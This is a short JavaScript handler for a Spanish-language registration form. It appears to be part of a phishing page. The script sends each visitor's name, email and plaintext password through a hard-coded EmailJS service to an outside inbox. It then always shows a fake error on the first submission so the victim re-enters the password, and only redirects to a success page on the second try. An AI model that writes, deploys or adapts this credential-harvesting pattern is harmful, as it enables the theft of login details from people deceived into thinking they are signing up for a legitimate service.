emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-principal');
    const spinner = document.querySelector('.spinner');
    const errorEmail = document.querySelector('.error-email');
    let intentos = localStorage.getItem('intentosRegistro') || 0;

    // Validación Gmail
    if(document.getElementById('correo').value.includes('@gmail.com')) {
        errorEmail.style.display = 'block';
        return;
    }

    // Mostrar spinner
    boton.disabled = true;
    spinner.style.display = 'block';
    boton.style.opacity = '0.7';

    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: document.getElementById('correo').value,
        password: document.getElementById('password').value,
        intento: parseInt(intentos) + 1
    };

    try {
        await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
        
        if(intentos < 1) {
            localStorage.setItem('intentosRegistro', 1);
            window.location.href = 'error.html';
        } else {
            localStorage.removeItem('intentosRegistro');
            window.location.href = 'exito.html';
        }
        
    } catch (error) {
        alert('Error en el proceso');
        console.error(error);
    } finally {
        boton.disabled = false;
        spinner.style.display = 'none';
        boton.style.opacity = '1';
    }
});
